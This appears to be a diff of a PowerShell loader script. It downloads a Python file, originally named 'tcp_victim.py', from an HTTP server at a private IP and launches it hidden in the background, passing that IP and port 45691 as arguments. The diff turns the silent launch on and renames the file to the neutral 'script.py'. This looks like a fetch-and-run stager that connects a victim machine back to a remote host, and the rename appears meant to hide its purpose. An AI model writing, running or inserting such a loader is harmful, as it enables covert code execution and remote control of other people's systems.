@@ -46,7 +46,7 @@ $pythonPath = "$pythonPath\python.exe"
 ## Option2: Download the python script from http repository
 $remoteIP = "192.168.100.233"
 $remotePort = 80
-$remoteFile = "tcp_victim.py"
+$remoteFile = "script.py"
 $requirementsFile = "requirements.txt"
 
 $httpRepository = "http://${remoteIP}:${remotePort}"
@@ -83,7 +83,7 @@ try {
 $targetPort = "45691"
 if (Test-Path -Path $scriptPath) {
     # Start the Python script in the background
-    #Start-Process -FilePath $pythonPath -ArgumentList @("$scriptPath", "$remoteIP", "$targetPort") -NoNewWindow -RedirectStandardOutput "${scriptPath}_log" -RedirectStandardError "${scriptPath}_ErrorLog"
+    Start-Process -FilePath $pythonPath -ArgumentList @("$scriptPath", "$remoteIP", "$targetPort") -NoNewWindow -RedirectStandardOutput "${scriptPath}_log" -RedirectStandardError "${scriptPath}_ErrorLog"
     Write-Output "[!] Python script started in the background."
 } else {
     Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
